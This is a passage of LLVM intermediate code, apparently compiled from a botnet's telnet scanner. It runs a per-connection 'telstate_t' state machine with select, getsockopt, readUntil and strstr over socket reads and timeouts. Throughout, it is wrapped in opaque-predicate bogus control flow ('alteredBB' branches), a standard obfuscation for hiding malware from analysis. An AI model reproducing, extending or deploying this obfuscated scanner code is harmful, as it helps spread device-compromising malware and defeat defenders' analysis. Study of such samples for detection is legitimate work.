  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = call i32 @sclose(i32 %280)
  %282 = load i32, i32* %2, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 3
  store i8 1, i8* %285, align 1
  br label %295

; <label>:286:                                    ; preds = %271, %originalBBpart214
  %287 = load i32, i32* %2, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 2
  store i8 1, i8* %290, align 8
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 6
  store i32 0, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %286, %275
  br label %3223

; <label>:296:                                    ; preds = %84
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 6
  %301 = load i32, i32* %300, align 4
  %302 = icmp eq i32 %301, 0
  br i1 %302, label %303, label %310

; <label>:303:                                    ; preds = %296
  %304 = call i64 @time(i64* null) #2
  %305 = trunc i64 %304 to i32
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 6
  store i32 %305, i32* %309, align 4
  br label %310

; <label>:310:                                    ; preds = %303, %296
  br label %311

; <label>:311:                                    ; preds = %310
  %312 = load i32, i32* @x.69
  %313 = load i32, i32* @y.70
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %311
  %320 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %321 = getelementptr inbounds [16 x i64], [16 x i64]* %320, i64 0, i64 0
  %322 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %321) #2, !srcloc !6
  %323 = extractvalue { i64, i64* } %322, 0
  %324 = extractvalue { i64, i64* } %322, 1
  %325 = trunc i64 %323 to i32
  store i32 %325, i32* %12, align 4
  %326 = ptrtoint i64* %324 to i64
  %327 = trunc i64 %326 to i32
  store i32 %327, i32* %13, align 4
  %328 = load i32, i32* @x.69
  %329 = load i32, i32* @y.70
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %336

; <label>:336:                                    ; preds = %originalBBpart218
  br label %337

; <label>:337:                                    ; preds = %336
  %338 = load i32, i32* @x.69
  %339 = load i32, i32* @y.70
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %337
  %346 = load i32, i32* %2, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 0
  %350 = load i32, i32* %349, align 16
  %351 = srem i32 %350, 64
  %352 = zext i32 %351 to i64
  %353 = shl i64 1, %352
  %354 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 0
  %359 = load i32, i32* %358, align 16
  %360 = sdiv i32 %359, 64
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds [16 x i64], [16 x i64]* %354, i64 0, i64 %361
  %363 = load i64, i64* %362, align 8
  %364 = or i64 %363, %353
  store i64 %364, i64* %362, align 8
  %365 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %365, align 8
  %366 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %366, align 8
  %367 = load i32, i32* %2, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 0
  %371 = load i32, i32* %370, align 16
  %372 = add nsw i32 %371, 1
  %373 = call i32 @select(i32 %372, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %373, i32* %3, align 4
  %374 = load i32, i32* %3, align 4
  %375 = icmp eq i32 %374, 1
  %376 = load i32, i32* @x.69
  %377 = load i32, i32* @y.70
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart260, label %originalBB20alteredBB

originalBBpart260:                                ; preds = %originalBB20
  br i1 %375, label %384, label %473

; <label>:384:                                    ; preds = %originalBBpart260
  %385 = load i32, i32* @x.69
  %386 = load i32, i32* @y.70
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %384
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 0
  %397 = load i32, i32* %396, align 16
  %398 = bitcast i32* %7 to i8*
  %399 = call i32 @getsockopt(i32 %397, i32 1, i32 4, i8* %398, i32* %6) #2
  %400 = load i32, i32* %7, align 4
  %401 = icmp ne i32 %400, 0
  %402 = load i32, i32* @x.69
  %403 = load i32, i32* @y.70
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %401, label %410, label %425

; <label>:410:                                    ; preds = %originalBBpart264
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 16
  %416 = call i32 @sclose(i32 %415)
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 2
  store i8 0, i8* %420, align 8
  %421 = load i32, i32* %2, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 3
  store i8 1, i8* %424, align 1
  br label %472

; <label>:425:                                    ; preds = %originalBBpart264
  %426 = load i32, i32* @x.69
  %427 = load i32, i32* @y.70
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %425
  %434 = load i32, i32* %2, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 0
  %438 = load i32, i32* %437, align 16
  %439 = load i32, i32* %2, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 16
  %444 = call i32 (i32, i32, ...) @fcntl(i32 %443, i32 3, i8* null)
  %445 = and i32 %444, -2049
  %446 = call i32 (i32, i32, ...) @fcntl(i32 %438, i32 4, i32 %445)
  %447 = load i32, i32* %2, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 6
  store i32 0, i32* %450, align 4
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 7
  store i16 0, i16* %454, align 16
  %455 = load i32, i32* %2, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 8
  %459 = load i8*, i8** %458, align 8
  call void @llvm.memset.p0i8.i64(i8* %459, i8 0, i64 1024, i32 1, i1 false)
  %460 = load i32, i32* %2, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 2
  store i8 2, i8* %463, align 8
  %464 = load i32, i32* @x.69
  %465 = load i32, i32* @y.70
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart279, label %originalBB66alteredBB

originalBBpart279:                                ; preds = %originalBB66
  br label %3224

; <label>:472:                                    ; preds = %410
  br label %508

; <label>:473:                                    ; preds = %originalBBpart260
  %474 = load i32, i32* %3, align 4
  %475 = icmp eq i32 %474, -1
  br i1 %475, label %476, label %507

; <label>:476:                                    ; preds = %473
  %477 = load i32, i32* @x.69
  %478 = load i32, i32* @y.70
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %476
  %485 = load i32, i32* %2, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 0
  %489 = load i32, i32* %488, align 16
  %490 = call i32 @sclose(i32 %489)
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 2
  store i8 0, i8* %494, align 8
  %495 = load i32, i32* %2, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %496
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %497, i32 0, i32 3
  store i8 1, i8* %498, align 1
  %499 = load i32, i32* @x.69
  %500 = load i32, i32* @y.70
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %507

; <label>:507:                                    ; preds = %originalBBpart283, %473
  br label %508

; <label>:508:                                    ; preds = %507, %472
  %509 = load i32, i32* @x.69
  %510 = load i32, i32* @y.70
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %508
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 6
  %521 = load i32, i32* %520, align 4
  %522 = add i32 %521, 10
  %523 = zext i32 %522 to i64
  %524 = call i64 @time(i64* null) #2
  %525 = icmp slt i64 %523, %524
  %526 = load i32, i32* @x.69
  %527 = load i32, i32* @y.70
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart2103, label %originalBB85alteredBB

originalBBpart2103:                               ; preds = %originalBB85
  br i1 %525, label %534, label %549

; <label>:534:                                    ; preds = %originalBBpart2103
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 0
  %539 = load i32, i32* %538, align 16
  %540 = call i32 @sclose(i32 %539)
  %541 = load i32, i32* %2, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 2
  store i8 0, i8* %544, align 8
  %545 = load i32, i32* %2, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 3
  store i8 1, i8* %548, align 1
  br label %549

; <label>:549:                                    ; preds = %534, %originalBBpart2103
  br label %3223

; <label>:550:                                    ; preds = %84
  %551 = load i32, i32* %2, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 6
  %555 = load i32, i32* %554, align 4
  %556 = icmp eq i32 %555, 0
  br i1 %556, label %557, label %580

; <label>:557:                                    ; preds = %550
  %558 = load i32, i32* @x.69
  %559 = load i32, i32* @y.70
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %557
  %566 = call i64 @time(i64* null) #2
  %567 = trunc i64 %566 to i32
  %568 = load i32, i32* %2, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 6
  store i32 %567, i32* %571, align 4
  %572 = load i32, i32* @x.69
  %573 = load i32, i32* @y.70
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %580

; <label>:580:                                    ; preds = %originalBBpart2107, %550
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 16
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 8
  %590 = load i8*, i8** %589, align 8
  %591 = load i32, i32* %2, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 7
  %595 = load i16, i16* %594, align 16
  %596 = zext i16 %595 to i32
  %597 = call i32 @readUntil(i32 %585, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %590, i32 1024, i32 %596)
  %598 = icmp ne i32 %597, 0
  br i1 %598, label %599, label %663

; <label>:599:                                    ; preds = %580
  %600 = load i32, i32* @x.69
  %601 = load i32, i32* @y.70
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %599
  %608 = load i32, i32* %2, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 6
  store i32 0, i32* %611, align 4
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 7
  store i16 0, i16* %615, align 16
  %616 = load i32, i32* %2, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 8
  %620 = load i8*, i8** %619, align 8
  %621 = call i8* @strstr(i8* %620, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %622 = icmp ne i8* %621, null
  %623 = load i32, i32* @x.69
  %624 = load i32, i32* @y.70
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br i1 %622, label %631, label %636

; <label>:631:                                    ; preds = %originalBBpart2111
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 2
  store i8 5, i8* %635, align 8
  br label %658

; <label>:636:                                    ; preds = %originalBBpart2111
  %637 = load i32, i32* @x.69
  %638 = load i32, i32* @y.70
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %636
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 8
  %649 = load i8*, i8** %648, align 8
  call void @llvm.memset.p0i8.i64(i8* %649, i8 0, i64 1024, i32 1, i1 false)
  %650 = load i32, i32* @x.69
  %651 = load i32, i32* @y.70
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %658

; <label>:658:                                    ; preds = %originalBBpart2115, %631
  %659 = load i32, i32* %2, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 2
  store i8 3, i8* %662, align 8
  br label %3224

; <label>:663:                                    ; preds = %580
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 16
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 8
  %673 = load i8*, i8** %672, align 8
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 7
  %678 = load i16, i16* %677, align 16
  %679 = zext i16 %678 to i32
  %680 = call i32 @readUntil(i32 %668, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %673, i32 1024, i32 %679)
  %681 = icmp ne i32 %680, 0
  br i1 %681, label %682, label %746

; <label>:682:                                    ; preds = %663
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 6
  store i32 0, i32* %686, align 4
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 7
  store i16 0, i16* %690, align 16
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 8
  %695 = load i8*, i8** %694, align 8
  %696 = call i8* @strstr(i8* %695, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %697 = icmp ne i8* %696, null
  br i1 %697, label %698, label %719

; <label>:698:                                    ; preds = %682
  %699 = load i32, i32* @x.69
  %700 = load i32, i32* @y.70
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %698
  %707 = load i32, i32* %2, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 2
  store i8 5, i8* %710, align 8
  %711 = load i32, i32* @x.69
  %712 = load i32, i32* @y.70
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %725

; <label>:719:                                    ; preds = %682
  %720 = load i32, i32* %2, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 8
  %724 = load i8*, i8** %723, align 8
  call void @llvm.memset.p0i8.i64(i8* %724, i8 0, i64 1024, i32 1, i1 false)
  br label %725

; <label>:725:                                    ; preds = %719, %originalBBpart2119
  %726 = load i32, i32* @x.69
  %727 = load i32, i32* @y.70
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %725
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 2
  store i8 3, i8* %737, align 8
  %738 = load i32, i32* @x.69
  %739 = load i32, i32* @y.70
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %3224

; <label>:746:                                    ; preds = %663
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 0
  %751 = load i32, i32* %750, align 16
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 8
  %756 = load i8*, i8** %755, align 8
  %757 = load i32, i32* %2, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 7
  %761 = load i16, i16* %760, align 16
  %762 = zext i16 %761 to i32
  %763 = call i32 @readUntil(i32 %751, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %756, i32 1024, i32 %762)
  %764 = icmp ne i32 %763, 0
  br i1 %764, label %765, label %813

; <label>:765:                                    ; preds = %746
  %766 = load i32, i32* @x.69
  %767 = load i32, i32* @y.70
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %765
  %774 = load i32, i32* %2, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 6
  store i32 0, i32* %777, align 4
  %778 = load i32, i32* %2, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 7
  store i16 0, i16* %781, align 16
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 8
  %786 = load i8*, i8** %785, align 8
